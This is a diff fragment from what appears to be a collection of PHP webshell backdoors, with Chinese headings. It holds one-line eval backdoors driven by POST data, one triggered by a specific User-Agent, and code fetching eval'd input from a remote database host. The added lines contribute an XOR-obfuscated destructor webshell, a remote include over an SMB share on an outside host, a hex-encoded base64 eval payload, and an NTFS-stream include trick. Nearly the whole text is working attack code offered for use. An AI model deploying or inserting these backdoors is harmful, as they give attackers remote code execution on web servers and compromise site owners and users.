@@ -17,3 +17,37 @@ eval(mysqli_fetch_assoc(mysqli_query(mysqli_connect('w2.pw','m','m','m'),'select
 <?php if($_SERVER[123]){eval(end(get_defined_vars()[_POST]));};?>
 
 <?php if($_SERVER[HTTP_USER_AGENT]==="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36  "){eval(reset(get_defined_vars()[_POST]));};?>
+
+-------------------------------------------------------------------------
+
+<?php
+class PXGF{
+    function __destruct(){
+        $RAFH='slvf*o'^"x12x1fx5x3x58x1b";
+        return @$RAFH("$this->WSXP");
+    }
+}
+$pxgf=new PXGF();
+@$pxgf->WSXP=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
+?>
+
+
+-----------------------------------------------------------------------
+利用SMB共享文件绕过PHP远程文件包含(windows下
+-----------------------------------------------------------------------
+<?php
+include('\\\s.w2.pw\my\1.php');
+?>
+
+密码是'1' ;
+
+<PHP_BASE>
+406576616C286261736536345F6465636F646528245F504F53545B616374696F6E5D29293B&action=%s
+</PHP_BASE>
+
+
+-----------------------------------------------------------------------ntfs文件流
+-----------------------------------------------------------------------
+<?php include('/:1.txt');?>
+
+echo "shell" >> /:1.txt
